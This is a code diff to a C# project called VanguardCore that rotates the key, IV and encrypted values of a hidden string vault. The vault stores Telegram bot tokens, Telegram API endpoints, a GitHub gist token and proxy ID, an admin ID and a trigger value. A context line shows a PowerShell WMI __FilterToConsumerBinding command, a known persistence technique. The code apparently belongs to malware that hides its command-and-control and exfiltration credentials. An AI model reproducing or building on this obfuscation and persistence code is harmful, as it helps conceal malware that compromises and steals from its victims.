@@ -172,21 +172,21 @@ namespace VanguardCore
 
         // --- Secure Vault for Baked-in Strings (Vault 2.0) ---
         private struct VaultEntry { public string C; public string T; }
-        private static byte[] VAULT_KEY = Convert.FromBase64String("13mZaXyAxN/u1/z4tRKyC4tnvWXteQOLI/+WUYk167A=");
-        private static byte[] VAULT_IV = Convert.FromBase64String("wvx1BFpKa2K71ZFt");
+        private static byte[] VAULT_KEY = Convert.FromBase64String("sHvta4qBttWCHHHrjL+E4HqAsn/jc2RuRiCK80BSvmw=");
+        private static byte[] VAULT_IV = Convert.FromBase64String("IN79ZxfItqn4bVIQ");
         
         private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>
         {
-            { "ADMIN_ID", new VaultEntry { C = "0UJzLxhTTGADoZQoSHI=", T = "zyPiK7xIpUd799RLcKSIzg==" } },
-            { "TG_API_BASE", new VaultEntry { C = "lAc3b1hcVnpX4sw+CyKv0uH1IFu5qaagUw==", T = "nHqBZ40GaHO4aXT7ABkavA==" } },
-            { "GIST_GITHUB_TOKEN", new VaultEntry { C = "mxszQBI3CxpUoe1yHR2t3dfxLgT7/oewT8mZ2MLTMy/AZmesaalmJA==", T = "EVcfp9yhVcrD+Nur8VLaWw==" } },
-            { "TG_API_FRONT", new VaultEntry { C = "lAc3b1hcVnpA88t3Ciax06vgIELysbW+Uv77kt+GHgfMIy+0WvMnBEAF70lhZ1Mh", T = "/m3m8ArNMmEPICW6FganqA==" } },
-            { "GIST_PROXY_ID", new VaultEntry { C = "nURzKxhQSDBQosYmRnPx1rXhIw6u9OHzGL6z1tyEXkE=", T = "eP3knBF0YsGmGRF7NMILQw==" } },
-            { "BOT_TOKEN_3", new VaultEntry { C = "xEZxLxpeSGIPpZ9RPgGb/P+xLlLiqOelBt66qvzXDUXIZAPzVP85WggQ01d9bQ==", T = "44sUD1Cp3c13xKyOPw6zdw==" } },
-            { "TG_FILE_BASE", new VaultEntry { C = "lAc3b1hcVnpX4sw+CyKv0uH1IFu5qaagU+6/jd/K", T = "6GU6tPhxsGspv/wMlfoDLA==" } },
-            { "BOT_TOKEN_1", new VaultEntry { C = "xEd6KBpeQWUCoJ9RPgGI9v+3CHzc9Z/xE861r9W3XzbrGGP8dMwtHkpAygR3Uw==", T = "XhfyMF+gVBQT3SDGfiZ/WA==" } },
-            { "BOT_TOKEN_2", new VaultEntry { C = "xER0LhpSTmQHq59RPgG3ms+2JQOj8O2pNNKfkojcKQLOEzDwedswOhUt6CtvNg==", T = "7bPDQxHn6EM7TRYpoGGC9Q==" } },
-            { "MS_TRIGGER", new VaultEntry { C = "nxwub14SHCdS98NxCiu3xKjiOVM=", T = "Onb+M3lb1duTamwA04/zMg==" } }
+            { "ADMIN_ID", new VaultEntry { C = "CO1alaw8CqoIDRyUxtE=", T = "cQlpN/neA57iRKmAkNesiQ==" } },
+            { "TG_API_BASE", new VaultEntry { C = "Tage1ewzELBcTkSChYGOXldK4GU703aXIQ==", T = "CpLugmJ27KXknlOK0Ut4Ng==" } },
+            { "GIST_GITHUB_TOKEN", new VaultEntry { C = "QrQa+qZYTdBfDWXOk76MUWFO7jp5hFeHPZ9QHyiXMxtTYxooWnSttw==", T = "NR9Rv+3ZlibQtjxbNVTyOg==" } },
+            { "TG_API_FRONT", new VaultEntry { C = "Tage1ewzELBLX0PLhIWQXx1f4Hxwy2WJIKgyVTXCHjNfJlIwaS7slyLcP1GwlZN4", T = "E7yWzP6STmzAgwhMqIcZMQ==" } },
+            { "GIST_PROXY_ID", new VaultEntry { C = "ROtakaw/DvpbDk6ayNDQWgNe4zAsjjHEauh6ETbAXnU=", T = "myVnjA1r8HWBHBYXZVjmTg==" } },
+            { "BOT_TOKEN_3", new VaultEntry { C = "HelYla4xDqgECRftsKK6cEkO7mxg0jeSdIhzbRaTDXFbYX53ZyLyyWrJA0+snw==", T = "Lx+3CDcJarUDCpcY7gCydA==" } },
+            { "TG_FILE_BASE", new VaultEntry { C = "Tage1ewzELBcTkSChYGOXldK4GU703aXIbh2SjWO", T = "5uqY/qrdjhNC78C5yTLEDw==" } },
+            { "BOT_TOKEN_1", new VaultEntry { C = "HehTkq4xB68JDBftsKKpekkIyEJej0/GYZh8aD/zXwJ4HR54RxHmjSiZGhymoQ==", T = "JoN/UwlEJzwtU+OVAbtb1w==" } },
+            { "BOT_TOKEN_2", new VaultEntry { C = "HetdlK49CK4MBxftsKKWFnkJ5T0hij2eRoRWVWKYKTZdFk10Sgb7qXf0ODO+xA==", T = "L/z3EP3Nz+Y6n4osl7L2aA==" } },
+            { "MS_TRIGGER", new VaultEntry { C = "RrMH1ep9Wu1ZW0vNhIiWSB5d+W0=", T = "Jra0LJSzD22g99SJGter5g==" } }
         };
 
         public static unsafe string Resolve(string id)
@@ -2018,6 +2018,7 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
         }
     }
 }
+
 
 
 
